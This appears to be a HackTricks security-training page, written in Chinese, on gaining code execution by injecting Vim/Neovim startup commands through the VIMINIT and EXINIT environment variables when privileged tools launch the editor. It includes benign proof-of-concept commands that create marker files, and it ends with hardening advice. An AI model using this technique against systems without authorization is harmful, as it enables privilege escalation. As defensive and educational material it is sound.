# macOS Vim/Neovim Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 概述

Vim 自带的 scripting language（Vimscript）可以在启动时通过环境变量运行 **任意 Ex commands 和 shell commands**。如果权限更高的进程（维护/root workflow、`sudo vim …`、由其他工具启动的 editor、`crontab -e`、`visudo`、调用 editor 的 `git`/`less`，……）在 attacker 可控的 environment 下启动 Vim/Neovim，attacker 就能在该 context 中获得 code execution。

## `VIMINIT`

初始化期间，Vim 会读取并执行 **`VIMINIT`** 中的 Ex commands。Ex commands 包括 `:!cmd`（运行 shell command）和 `:call system(...)`，因此单个变量即可在编辑任何文件之前实现 arbitrary execution。<sup>[[1]](#references)</sup>
```bash
echo "hi" > /tmp/victim.txt

# Shell command via Ex ':!'
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
ls -la /tmp/vim-executed

# Pure Vimscript (no external process, e.g. write a file)
printf ':qa!\n' | VIMINIT='call writefile(["x"],"/tmp/vim-vimscript")' vim /tmp/victim.txt
```
通过 stdin 传入的 `:qa!` 只会在 payload 已经运行后关闭编辑器；在真实场景中，受害者只需正常打开 Vim。

## `EXINIT`

如果未设置 `VIMINIT`，Vim（以及 `vi`/`ex` 兼容二进制文件）会回退到 **`EXINIT`**，其执行方式相同。这是同一 primitive 在经典 vi 时代的变体。<sup>[[1]](#references)</sup>
```bash
printf ':qa!\n' | EXINIT='silent! !touch /tmp/exinit-executed' vim /tmp/victim.txt
ls -la /tmp/exinit-executed
```
## 注意事项和限制

- **Neovim** 也会遵循 `VIMINIT`（它会在用户的 `init.vim`/`init.lua` 之前检查）。
- 批处理/Ex 模式（`vim -es` / `vim -Es`）不会加载 `VIMINIT`/`EXINIT`；这些变量会在普通（交互式）启动过程中执行，这也是常见的受害者场景。
- 相关的基于文件的 vectors 包括每个目录中的 `exrc`/`.nvimrc` “modeline”/local-rc 功能以及 `-u <vimrc>`；上述环境变量路径完全不需要任何可写文件。

## 加固

- 在从特权或自动化上下文启动编辑器之前清理环境（移除 `VIMINIT`/`EXINIT`），并优先使用能够重置环境的 `sudo -i`/`env -i` wrappers。
- 将 `EDITOR`/`VISUAL` 设置为受信任的绝对路径，避免在继承用户环境的情况下以 root 身份运行编辑器。
- 对于其启动的任何 Vim/Neovim，均应将对目标环境的控制视为等同于代码执行。

## References

- [1] [Vim documentation — `starting.txt`（初始化、`VIMINIT`、`EXINIT`）](https://vimhelp.org/starting.txt.html#initialization)
{{#include ../../../banners/hacktricks-training.md}}
